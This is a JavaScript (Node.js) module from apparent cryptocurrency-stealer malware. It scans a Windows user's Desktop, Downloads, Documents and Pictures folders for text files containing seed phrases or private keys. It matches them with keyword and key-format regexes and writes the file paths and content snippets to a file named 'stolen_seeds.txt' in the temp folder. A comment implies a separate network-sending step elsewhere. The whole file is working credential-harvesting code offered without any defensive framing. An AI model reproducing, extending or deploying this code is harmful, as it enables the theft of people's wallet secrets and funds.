const fs = require('fs');
const path = require('path');

async function scanForSeedsAndKeys() {
    console.log("[DEBUG] Scanning for seeds/keys...");
    const found = [];
    const searchPaths = [
        process.env.USERPROFILE + '\\Desktop',
        process.env.USERPROFILE + '\\Downloads',
        process.env.USERPROFILE + '\\Documents',
        process.env.USERPROFILE + '\\Pictures'
    ];
    const seedRegex = /(seed phrase|recovery phrase|mnemonics?|secret key|private key|wallet seed|12 words|24 words)/i;
    const keyRegex = /(0x[a-fA-F0-9]{64}|[5KL][1-9A-HJ-NP-Za-km-z]{50,51})/;
    for (const dir of searchPaths) {
        try {
            const files = fs.readdirSync(dir, { withFileTypes: true });
            for (const file of files) {
                if (file.isFile() && /\.(txt|json|doc|log)$/i.test(file.name)) {
                    try {
                        const content = fs.readFileSync(path.join(dir, file.name), 'utf8');
                        if (seedRegex.test(content) || keyRegex.test(content)) {
                            found.push({
                                file: file.name,
                                path: path.join(dir, file.name),
                                snippet: content.substring(0, 200) + '...'
                            });
                        }
                    } catch {}
                }
            }
        } catch {}
    }
    console.log(`[DEBUG] Found ${found.length} potential seed/key files`);

    // Save full list to file (local only - no FormData send here)
    if (found.length > 0) {
        const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_seeds.txt');
        let text = "Potential Seeds/Keys Found\n\n";
        found.forEach(item => {
            text += `File: ${item.file}\nPath: ${item.path}\nSnippet: ${item.snippet}\n\n`;
        });
        fs.writeFileSync(outputPath, text);
        console.log(`[SUCCESS] Saved seeds/keys to: ${outputPath}`);
    }

    return found;
}

module.exports = { scanForSeedsAndKeys };
